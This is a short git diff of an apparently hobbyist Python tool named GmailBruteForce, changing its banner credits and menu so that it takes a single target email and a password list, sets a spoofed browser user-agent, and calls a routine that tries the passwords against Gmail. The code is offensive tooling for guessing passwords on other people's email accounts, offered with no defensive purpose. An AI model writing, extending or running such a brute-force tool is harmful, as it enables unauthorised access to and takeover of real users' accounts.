@@ -41,10 +41,10 @@ class GmailBruteForce():
 
 print('''
 	==================================
-	|      [Gmail] ==> 3             |
+	|    [brute force]   [Gmail]     |
 	|--------------------------------|
-	| snapchat: flaah999             |
-	| CoDeD By TA Hacker (@0xfff0800)|
+	| instgram: flaah999             |
+	| GilmarFilho                    |
 	|--------------------------------|
 	''')
 
@@ -52,18 +52,18 @@ instance = GmailBruteForce()
 
 do = input('''
 		Choose any number ?
-		1 - Email file
-		2 - target email
+		1 - Gmail.com
+		2 - nulo 
 		
 		==> ''')
 
 if do == '1':
-    user = input("List Of Usernames => ")
-    passfile = input("List Of Passwords => ")
-
-    instance.get_acc_list(user)
-    instance.get_pass_list(passfile)
+    user = input("email : ")
+    senha = input("passlist : ")
     headers = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
+
+    instance.accounts.append(user)
+    instance.get_pass_list(senha)
 
     instance.try_gmail()
    
